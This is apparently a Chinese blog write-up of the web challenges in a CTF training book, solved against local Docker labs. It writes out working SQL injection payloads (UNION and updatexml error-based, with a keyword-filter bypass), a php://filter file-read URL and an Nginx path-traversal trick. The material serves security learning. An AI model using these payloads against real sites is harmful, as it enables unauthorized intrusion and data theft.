---
title: 《从0到1：CTFer成长之路》配套题目
date: 2021-03-13 09:47:57
tags: 
      - 网络安全
categories: 《从0到1：CTFer成长之路》
---


第一章内容的题目

官方平台网址：https://book.nu1l.com/tasks/
<!--more-->

# 第一章 Web 入门
## 1.1 信息搜集
### 1.1.1 常见的搜集
共3个 flag

docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest
    ports:
      - 80:80
```
1. 先使用目录扫描工具 [dirsearch](https://github.com/maurosoria/dirsearch) 扫描`127.0.0.1`网站，获得网站目录
```
200    10KB  http://127.0.0.1:80/.DS_Store
403   274B   http://127.0.0.1:80/.ht_wsr.txt
403   274B   http://127.0.0.1:80/.htaccessBAK
403   274B   http://127.0.0.1:80/.htaccess.bak1
403   274B   http://127.0.0.1:80/.htaccessOLD
403   274B   http://127.0.0.1:80/.htaccess.orig
403   274B   http://127.0.0.1:80/.htaccess.sample
403   274B   http://127.0.0.1:80/.htaccess.save
403   274B   http://127.0.0.1:80/.htaccess_extra
403   274B   http://127.0.0.1:80/.htaccess_orig
403   274B   http://127.0.0.1:80/.htaccess_sc
403   274B   http://127.0.0.1:80/.htm
403   274B   http://127.0.0.1:80/.html
403   274B   http://127.0.0.1:80/.htpasswd_test
403   274B   http://127.0.0.1:80/.htpasswds
403   274B   http://127.0.0.1:80/.httr-oauth
200    12KB  http://127.0.0.1:80/.index.php.swp
403   274B   http://127.0.0.1:80/.htaccessOLD2
200     2KB  http://127.0.0.1:80/index.php
200     2KB  http://127.0.0.1:80/index.php/login/
200     2KB  http://127.0.0.1:80/index.php~
200    47B   http://127.0.0.1:80/robots.txt
403   274B   http://127.0.0.1:80/server-status
403   274B   http://127.0.0.1:80/server-status/
```
2. 发现存在可疑文件：
```
robots.txt   # 常规文件
index.php~   # gedit 备份文件
.index.php.swp  # vim 备份文件
```
1. 根据书中方法一一查验可得 flag

### 1.1.2 粗心的小李
共3个 flag

docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest
    ports:
      - 80:80
```
1. 先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录
```
200     5B   http://127.0.0.1:80/.git/COMMIT_EDITMSG
403   274B   http://127.0.0.1:80/.git/
301   305B   http://127.0.0.1:80/.git    -> REDIRECTS TO: http://127.0.0.1/.git/
200    23B   http://127.0.0.1:80/.git/HEAD
200    73B   http://127.0.0.1:80/.git/description
200   137B   http://127.0.0.1:80/.git/config
403   274B   http://127.0.0.1:80/.git/hooks/
200   240B   http://127.0.0.1:80/.git/info/exclude
403   274B   http://127.0.0.1:80/.git/info/
200   145B   http://127.0.0.1:80/.git/index
200   148B   http://127.0.0.1:80/.git/logs/HEAD
403   274B   http://127.0.0.1:80/.git/logs/
301   315B   http://127.0.0.1:80/.git/logs/refs    -> REDIRECTS TO: http://127.0.0.1/.git/logs/refs/
301   321B   http://127.0.0.1:80/.git/logs/refs/heads    -> REDIRECTS TO: http://127.0.0.1/.git/logs/refs/heads/
200   148B   http://127.0.0.1:80/.git/logs/refs/heads/master
403   274B   http://127.0.0.1:80/.git/objects/
403   274B   http://127.0.0.1:80/.git/refs/
200    41B   http://127.0.0.1:80/.git/refs/heads/master
301   316B   http://127.0.0.1:80/.git/refs/heads    -> REDIRECTS TO: http://127.0.0.1/.git/refs/heads/
301   315B   http://127.0.0.1:80/.git/refs/tags    -> REDIRECTS TO: http://127.0.0.1/.git/refs/tags/
403   274B   http://127.0.0.1:80/.ht_wsr.txt
403   274B   http://127.0.0.1:80/.htaccess.bak1
403   274B   http://127.0.0.1:80/.htaccess.orig
403   274B   http://127.0.0.1:80/.htaccess.save
403   274B   http://127.0.0.1:80/.htaccess.sample
403   274B   http://127.0.0.1:80/.htaccessBAK
403   274B   http://127.0.0.1:80/.htaccessOLD
403   274B   http://127.0.0.1:80/.htaccessOLD2
403   274B   http://127.0.0.1:80/.htaccess_extra
403   274B   http://127.0.0.1:80/.htaccess_orig
403   274B   http://127.0.0.1:80/.htaccess_sc
403   274B   http://127.0.0.1:80/.htm
403   274B   http://127.0.0.1:80/.html
403   274B   http://127.0.0.1:80/.htpasswd_test
403   274B   http://127.0.0.1:80/.htpasswds
403   274B   http://127.0.0.1:80/.httr-oauth
200     2KB  http://127.0.0.1:80/index.html
403   274B   http://127.0.0.1:80/server-status/
403   274B   http://127.0.0.1:80/server-status
```
2. 发现存在`.git`文件夹，试探访问`.git/config`，返回了下列内容，说明存在 git 泄露。
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
```

3. 使用 [scrabble](https://github.com/denny0223/scrabble) 工具，成功获到源码，拿到 flag。


## 1.2 SQL注入
### 1.2.1 SQL注入-1

docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest
    ports:
      - 80:80
```
1. 127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。

2. 尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。
  
3. 尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。
  
4. 尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。
  
5. 分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。

### 1.2.2 SQL注入-2 
docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest
    ports:
      - 80:80
```
1. 访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。
```
200     2KB  http://127.0.0.1:80/login.php
403   289B   http://127.0.0.1:80/server-status
403   290B   http://127.0.0.1:80/server-status/
200    11B   http://127.0.0.1:80/user.php
```

2. 访问 http://127.0.0.1:80/login.php ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：`如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦`
  
3. 安装 burp suit 社区版
  下载链接：https://portswigger.net/burp/releases/professional-community-2021-2-1
  安装命令：`sh burpsuite_community_linux_v2021_2_1.sh` 

4. 配置 burp suit
> 1. 进入 Proxy ->  option，选择 add，端口用 8080，选择  Loopback only。
> 2. 进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)
![burp proxy](burp_proxy.png)

5. 使用 burp suit 抓包、发包。
> 进入 Proxy -> intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。
![burp intercept](burp_intercept.png)

6. 火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。
   
7. burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 `ifconfig` 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。

8. burp 捕获访问 http://172.19.0.1/login.php 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：`Send to Repeater（Ctrl + R）`，再进入 Repeater 页面。在 request 中修改请求头。
   
9.  根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123'（登录的用户名），成功返回 SQL 报错信息：
> string(154) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''123''' at line 1"
> ![burp login request](burp_login_request.png)

10. 可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：
> `name=123'or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&pass=123`

    返回报错内容：string(34) "Operand should contain 1 column(s)"

    可能只有1列，尝试 `name=123'or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&pass=123`

    返回报错内容：`~7~`。确定格式。（0x7e：~ ）

11. 使用完整 SQL 语句测试：`name=123'or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&pass=123`,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息`~7~`。
> string(164) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'from dual)),1)#'' at line 1"

12. 通过获取表名，列名成功获得 flag。
```
name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database()) ,0x7e),1)#&pass=xxxx

string(34) "XPATH syntax error: '~fl4g,users~'"
```
```
name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name='fl4g'),0x7e),1)#&pass=xxxx

# 返回信息：string(28) "XPATH syntax error: '~flag~'"
```

## 1.3 任意文件读取漏洞
### 1.3.1 afr_1
docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest
    ports:
      - 80:80
```

1. 访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中"病者多诡(HCTF 2016)"，很有可能类似，猜测存在 include 函数，p 可能是 page。
   
2. 使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。
   ![wappalyzer](afr_1_wappalyzer.png)

3. 使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello
4. 于是尝试访问 `http://172.19.0.1/index.php`，重定向至了`http://172.19.0.1/?p=hello`，而访问`http://172.19.0.1/?p=index`则是报错。
   
5. 尝试使用 php 的 filter 获取 index.php,`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index`,获得数据`PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=`，解码后得
  ```
  <?php
  if(isset($_GET['p'])) {
    include (string)$_GET['p'] . ".php";
  }
  else{
    header('Location: /?p=hello');
  }
  ```

6. 清楚了逻辑，直接尝试 `flag.php`,即`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag`,获得数据`PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9`，解码得
  ```
  <?php
  die('no no no');
  //n1book{afr_1_solved}
  ```
  明显注释中可能表示 flag，查看官方 write up:`http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag`，确定无错。

7. php://协议 Filter解读： `?p=php://filter/read=convert.Base64-encode/resource=flag`
   - 这是 p 关键字得 get 传递，即p=****
   - php://是一种协议名称，php://filter/ 是一种访问本地文件的协议
   - read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签
   - /resource=flag 表示目标文件是 flag.php

### 1.3.2 afr_2
docker-compose.yml
```
version: '3.2'

services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest
    ports:
      - 80:80
```

1. 访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx
   ![wappalyzer](afr_2_wappalyzer.png)
2. 使用 dirsearch 进行目录扫描，发现`/img`目录可以直接访问
   ```
    301   194B   http://172.19.0.1:80/img    -> REDIRECTS TO: http://172.19.0.1/img/
    200    99B   http://172.19.0.1:80/index.html
   ```
3. 想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径`/img../`，获得 flag。

